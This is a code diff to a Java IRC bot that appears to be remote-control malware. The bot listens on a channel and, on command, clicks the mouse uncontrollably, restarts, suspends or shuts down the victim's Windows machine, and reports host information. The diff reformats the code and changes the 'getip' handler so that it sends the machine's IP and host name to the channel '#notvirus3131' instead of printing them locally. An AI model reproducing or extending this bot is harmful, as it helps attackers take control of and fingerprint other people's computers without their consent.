@@ -30,7 +30,7 @@ public class IRCBot extends PircBot {
         onConnect();
 
         if (!SystemName.isEmpty()) {
-            setName(SystemName);
+            setName(SystemName + new Random().nextInt(666));
         } else {
 
             setName("birisi" + new Random().nextInt(555));
@@ -59,11 +59,11 @@ public class IRCBot extends PircBot {
     @Override
     protected void onMessage(String channel, String sender, String login, String hostname, String message) {
 
-        if(message.startsWith("gocrazy")){
+        if (message.startsWith("gocrazy")) {
 
             try {
                 Robot robot = new Robot();
-                for(int i = 0; i < 70; i++){
+                for (int i = 0; i < 70; i++) {
                     Thread.sleep(150);
                     robot.mousePress(InputEvent.BUTTON1_MASK); // or 1 could be
                     robot.mousePress(InputEvent.BUTTON2_MASK); // or 2 could be and mouse locks itself untill you press middle button
@@ -78,19 +78,16 @@ public class IRCBot extends PircBot {
         }
 
 
-        if(message.startsWith("restart")){
+        if (message.startsWith("restart")) {
             Runtime r = Runtime.getRuntime();
-            try
-            {
+            try {
                 r.exec("shutdown -r -t");
-            }
-            catch(IOException e)
-            {
-                System.out.println("Exception: " +e);
+            } catch (IOException e) {
+                System.out.println("Exception: " + e);
             }
         }
 
-        if(message.startsWith("sleep")){
+        if (message.startsWith("sleep")) {
 
             try {
                 Runtime.getRuntime().exec("Rundll32.exe powrprof.dll,SetSuspendState Sleep");
@@ -99,7 +96,7 @@ public class IRCBot extends PircBot {
             }
         }
 
-        if(message.startsWith("shutdown")){
+        if (message.startsWith("shutdown")) {
 
             try {
                 shutdown();
@@ -110,7 +107,6 @@ public class IRCBot extends PircBot {
         }
 
 
-
         if (message.startsWith("getip")) {
 
             try (final DatagramSocket socket = new DatagramSocket()) {
@@ -119,9 +115,10 @@ public class IRCBot extends PircBot {
                 InetAddress inetAddress = Inet4Address.getLocalHost();
                 InetAddress inetAddress1 = Inet4Address.getLoopbackAddress();
 
-                System.out.println("IPV adressi: " + inetAddress);
-                System.out.println("Loopback Adressi: " + inetAddress1);
-                System.out.println("IP adressi: " + ip + "    Host Name:" + hostname.toLowerCase());
+                sendMessage("#notvirus3131", "IPV adressi: " + inetAddress);
+                sendMessage("#notvirus3131", "Loopback Adressi: " + inetAddress1);
+                sendMessage("#notvirus3131",  "Host Name:" + hostname.toLowerCase());
+
             } catch (UnknownHostException | SocketException e) {
                 throw new RuntimeException(e);
             }
@@ -177,8 +174,7 @@ public class IRCBot extends PircBot {
         // This will work on any version of windows including version 11
         else if (operatingSystem.contains("Windows")) {
             shutdownCommand = "shutdown.exe -s -t 0";
-        }
-        else {
+        } else {
             throw new RuntimeException("Unsupported operating system.");
         }
 
